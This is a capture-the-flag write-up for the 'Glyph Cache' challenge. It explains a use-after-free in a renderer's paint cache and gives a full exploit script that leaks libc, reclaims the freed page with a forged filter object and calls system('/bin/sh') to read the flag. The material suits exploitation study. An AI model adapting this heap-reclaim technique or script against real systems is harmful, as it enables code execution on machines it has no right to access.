# Glyph Cache

This challenge has a use-after-free in the paint cache.

The program caches a pointer to a `ComputedStyle` object when `paint` is called. Changing the theme rebuilds the style arena and frees the old one, but the cached paint data is not always invalidated.

Because of that, the renderer can later use a `ComputedStyle *` that points into freed memory.

## Bug

The important command sequence is:

```text
load /bin/sh
style clean
layout
paint
theme dark
optimize
inspect paint raw
```

After `paint`, the display list contains a cached style pointer:

```text
PaintText::style -> ComputedStyle
```

Running:

```text
theme dark
```

rebuilds the style arena and frees the old style page.

Normally, cached paint data should be rebuilt after this. However, the layout hash does not change, so:

```text
optimize
```

keeps the old paint cache.

This leaves `PaintText::style` pointing into the freed style page.

## Leak

The stale style pointer can be inspected with:

```text
inspect paint raw
```

This prints raw bytes from the freed allocation.

The first 16 leaked bytes contain allocator data that can be used to recover:

- the libc base
- the address of the freed style page

The exploit parses the leak with:

```python
line = p.recvline_contains(b'raw=')
raw = bytes.fromhex(line.split(b'raw=', 1)[1].strip().decode())

libc.address = u64(raw[:8]) - 0x203b20
style_page = u64(raw[8:16]) - 0x460
```

The first pointer is a libc address.

The second pointer points near the freed style allocation, so subtracting `0x460` gives the start of the old `StylePage`.

## Reclaiming the freed page

The freed object is a `StylePage` with size `0x430`.

The `profile add` command allocates a `ProfilePage` of the same size, which means it reliably reuses the freed chunk.

```python
payload = flat({
    0x10: style_page + 0x18,
    0x18: 0x46494C4648505947,
    0x20: libc.sym.system,
}, length=0x430)

cmd(b'profile add ' + payload.hex().encode())
```

The stale `ComputedStyle` pointer now points into attacker-controlled profile data.

The payload creates fake filter data inside the reclaimed page.

The important fields are:

```text
filter -> style_page + 0x18
magic  -> FILTER_MAGIC
run    -> system
```

The magic value is:

```text
0x46494C4648505947
```

When the renderer follows the stale style pointer, it sees what looks like a valid filter object.

## Getting command execution

Earlier, the string `/bin/sh` is loaded into the text object:

```text
load /bin/sh
```

The fake filter points its callback to:

```text
system
```

So when `render` processes the stale style, it effectively calls:

```c
system("/bin/sh");
```

The exploit then reads the flag through the shell:

```python
cmd(b'render')
sl(b'cat /flag.txt 2>/dev/null || cat server/flag.txt 2>/dev/null || echo shell')
```

## Exploit

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from time import sleep

exe = context.binary = ELF('./public/chall', checksec=False)
libc = ExtELF('./public/libc.so.6', checksec=False) if os.path.exists('./public/libc.so.6') else exe.libc

gdbscript = '''
init-pwndbg
# init-gef-bata
file ./public/chall
c
'''


def start(argv=[]):
    if args.LOCAL:
        ld = './public/ld-linux-x86-64.so.2'
        if os.path.exists(ld):
            p = process([ld, '--library-path', './public', exe.path] + argv)
        else:
            p = exe.process(argv)
        if args.GDB:
            gdb.attach(p, gdbscript=gdbscript)
            sleep(1)
    elif args.REMOTE:
        host_port = sys.argv[1:]
        host_port = [
            x for x in host_port
            if x not in ('LOCAL', 'REMOTE', 'GDB', 'RERUN')
        ]
        p = remote(host_port[0], int(host_port[1]))
    return p


def cmd(s):
    sla(b'glyph> ', s if isinstance(s, bytes) else s.encode())


p = start()

for s in (
    b'load /bin/sh',
    b'style clean',
    b'layout',
    b'paint',
    b'theme dark',
    b'optimize',
    b'inspect paint raw'
):
    cmd(s)

line = p.recvline_contains(b'raw=')
raw = bytes.fromhex(
    line.split(b'raw=', 1)[1].strip().decode()
)

libc.address = u64(raw[:8]) - 0x203b20
style_page = u64(raw[8:16]) - 0x460

payload = flat({
    0x10: style_page + 0x18,
    0x18: 0x46494C4648505947,
    0x20: libc.sym.system,
}, length=0x430)

cmd(b'profile add ' + payload.hex().encode())
cmd(b'render')

sl(
    b'cat /flag.txt 2>/dev/null || '
    b'cat server/flag.txt 2>/dev/null || '
    b'echo shell'
)

print(
    p.recvline_contains(
        b'flag{',
        timeout=2
    ).decode(errors='ignore').strip()
)

sl(b'exit')

interactive(flag=False)
```

## Summary

The exploit works by:

1. Creating a cached paint object.
2. Freeing its style arena with a theme change.
3. Keeping the stale cache through `optimize`.
4. Leaking libc and heap pointers from the freed style page.
5. Reclaiming the page with `profile add`.
6. Replacing the old style data with a fake filter.
7. Setting the filter callback to `system`.
8. Calling `render` to execute `system("/bin/sh")`.